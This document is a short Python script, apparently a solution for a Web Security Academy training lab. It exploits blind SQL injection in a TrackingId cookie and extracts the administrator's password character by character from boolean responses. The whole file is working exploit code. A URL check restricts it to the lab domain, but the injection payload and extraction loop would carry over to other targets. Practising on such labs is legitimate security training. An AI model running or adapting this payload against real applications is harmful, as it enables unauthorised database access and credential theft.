import requests
import string
import sys

if len(sys.argv) != 2:
    print("")
    print("usage: python3 death.py <lab_url>")
    print("example: python3 death.py https://0a370067040af8c380b1354700e4006c.web-security-academy.net")
    exit()

lab_url = str(sys.argv[1])

if "web-security-academy" not in lab_url:
    print("wrong lab url.")
    exit()

chars = list(string.ascii_lowercase + string.digits)

password = ""

while True:
    found_char = False

    for char in chars:
        trackingId=f"' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, {len(password)+1})='{password}{char}"

        print(f"{password}{char}")

        cookies = {
               'TrackingId': trackingId
        }

        r = requests.get(lab_url, cookies=cookies)

        if "Welcome back" in str(r.content):
            found_char = True
            password+=char
            print(password)
            break

    if not found_char:
        print("username: administrator, password: " + str(password))
        exit()
